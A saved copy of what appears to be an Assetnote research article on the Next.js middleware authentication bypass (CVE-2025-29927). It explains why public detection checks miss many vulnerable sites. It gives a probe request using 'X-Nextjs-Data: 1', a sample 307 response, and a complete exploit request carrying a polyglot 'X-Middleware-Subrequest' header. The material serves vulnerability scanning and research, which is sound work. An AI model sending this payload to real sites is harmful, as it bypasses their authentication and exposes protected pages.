---
author: Assetnote Research
aliases:
  - "Doing the Due Diligence: Analyzing the Next.js Middleware Bypass"
tags:
  - readwise/articles
  - nextjs
url: https://www.assetnote.io/resources/research/doing-the-due-diligence-analyzing-the-next-js-middleware-bypass-cve-2025-29927?__readwiseLocation=
created: 2025-04-01
---
# Doing the Due Diligence: Analyzing the Next.js Middleware Bypass

![rw-book-cover](https://cdn.prod.website-files.com/6422e507d5004f85d107063a/649c2686dd142039d6d5ea8e_Frame%201428.png)


At Assetnote, our scanning methodology and techniques are developed to be as accurate as possible. We prioritize identifying all exploitable instances across our customers' attack surfaces. To do this, we often have to go beyond public resources to understand intelligent and well-thought-out methodologies. [](https://read.readwise.io/read/01jq64721437qe4wjjs74b2et1)

## What's Wrong With The Publicly Disclosed Checks?
When considering how authentication mechanisms are implemented inside middleware, we can commonly expect developers to redirect or rewrite users to return to the authentication flow or login page. [](https://read.readwise.io/read/01jq647ecyenv6txhcem83chs1)


All [publicly disclosed checks](https://github.com/projectdiscovery/nuclei-templates/pull/11799/files) we were able to find that discover this vulnerability rely on the application presenting some rewrite logic in order to determine whether or not middleware could be present, before attempting to exploit this vulnerability.
The logic for the checks we have seen in the wild rely on the presence of `x-middleware-rewrite`, `x-middleware-next`, `x-middleware-redirect` inside the response headers. From our testing with various Next.js versions up to 14.2.24, the `x-middleware-rewrite` does not exist on a redirect, and `x-middleware-next` and `x-middleware-redirect` headers are not present on a redirect from the middleware layer. [^1]

This leaves a huge gap for applications that utilize redirects instead of rewrites inside their middleware layer. [](https://read.readwise.io/read/01jq647sjtd9sgee0v1mcw6xv2)



## Building a More Reliable Check
To understand whether or not the middleware layer is leading to an HTTP redirect, our team audited the Next.js code and found that there was a straightforward, yet effective way to leak an internal header inside a redirect response from the middleware layer: [](https://read.readwise.io/read/01jq649aemnpzcqt39dt3nzr6m)

By sending the header `x-nextjs-data: 1` in our HTTP request, it was possible to coerce Next.js to respond with an internal header `x-nextjs-redirect`, which all publicly disclosed checks do not account for. The `x-middleware-redirect` header can often get swallowed, leading to publicly disclosed checks missing many instances of this vulnerability. [](https://read.readwise.io/read/01jq64a12m1anj8f4842evdx64)

We can greatly simplify the exploitation of this issue by using a polyglot that avoids having to send multiple requests. We were able to achieve this with the following HTTP header, used to check for the presence of an authentication bypass:

`X-Middleware-Subrequest: src/middleware:nowaf:src/middleware:src/middleware:src/middleware:src/middleware:middleware:middleware:nowaf:middleware:middleware:middleware:pages/_middleware`

This lets us effectively cover the various potential cases without having to send multiple requests. [](https://read.readwise.io/read/01jq64c74g378eextg37y78bhb)

If you want to distil all the knowledge we present into this blog post into a simple scanning methodology, you can use the following HTTP request for your initial request:
```http
GET / HTTP/2
Host: target
Accept-Encoding: gzip, deflate, br
X-Nextjs-Data: 1
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Connection: close
Cache-Control: max-age=0
```
If the HTTP response is a 307, and contains any non null values for `x-nextjs-redirect`, `x-middleware-rewrite` or `x-nextjs-rewrite`, like so:
```http
HTTP/2 307 Temporary Redirect
Date: Mon, 24 Mar 2025 05:07:41 GMT
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
X-Content-Type-Options: nosniff
Referrer-Policy: strict-origin-when-cross-origin
X-Nextjs-Redirect: /login
X-Envoy-Upstream-Service-Time: 10
```

You can then attempt the exploit payload (with our improved polyglot): [](https://read.readwise.io/read/01jq64e8vp9qw3nc7kkp9s55ap)
```http
GET / HTTP/2
Host: target
Accept-Encoding: gzip, deflate, br
X-Nextjs-Data: 1
X-Middleware-Subrequest: src/middleware:nowaf:src/middleware:src/middleware:src/middleware:src/middleware:middleware:middleware:nowaf:middleware:middleware:middleware:pages/_middleware
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Cache-Control: max-age=0 
```

[^1]: [zhero_web_security - Next.js and the Corrupt Middleware The Authorizing Artifact](zhero_web_security%20-%20Next.js%20and%20the%20Corrupt%20Middleware%20The%20Authorizing%20Artifact.md)

